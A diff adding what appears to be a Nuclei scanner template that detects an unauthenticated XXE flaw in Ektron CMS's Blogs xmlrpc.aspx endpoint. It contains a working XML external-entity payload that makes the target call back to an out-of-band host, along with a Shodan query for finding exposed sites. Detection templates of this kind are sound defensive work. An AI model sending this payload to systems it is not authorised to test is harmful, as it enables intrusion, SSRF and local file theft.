@@ -1,0 +1,50 @@
+id: ektron-blog-xmlrpc-xxe
+
+info:
+  name: Ektron CMS Blogs xmlrpc.aspx - XML External Entity Injection
+  author: pussycat0x
+  severity: high
+  description: |
+    Detects XML External Entity (XXE) vulnerability in Ektron CMS Blogs component (/WorkArea/Blogs/xmlrpc.aspx). Allows unauthenticated attackers to read local files or perform SSRF.
+  reference:
+    - https://www.exploit-db.com/exploits/21085
+    - https://packetstormsecurity.com/files/116259/Ektron-CMS-8.5.0-File-Upload-XXE-Injection.html
+    - https://www.acunetix.com/vulnerabilities/web/ektron-cms-multiple-vulnerabilities
+  classification:
+    cwe-id: CWE-611,CWE-918
+  metadata:
+    verified: false
+    max-request: 2
+    shodan-query: http.html:"EktronClientManager"
+  tags: xxe,ektron,cms,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "EktronClientManager")'
+        condition: and
+
+  - raw:
+      - |
+        POST /WorkArea/Blogs/xmlrpc.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+        <!DOCTYPE scan [<!ENTITY test SYSTEM "http://{{interactsh-url}}">]>
+        <scan>&test;</scan>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, "dns")
+          - status_code == 200 || status_code == 500
+        condition: and
+# digest: 4b0a00483046022100f72525851cd2ecb640d0739d4b4b0309909d98c6a4487cb7a5d417bf8340be05022100882f683717c457570abc0958d1c173d5867b86a3eb0e7839e54138e6a580de62:922c64590222798bb761d5b6d8e72950
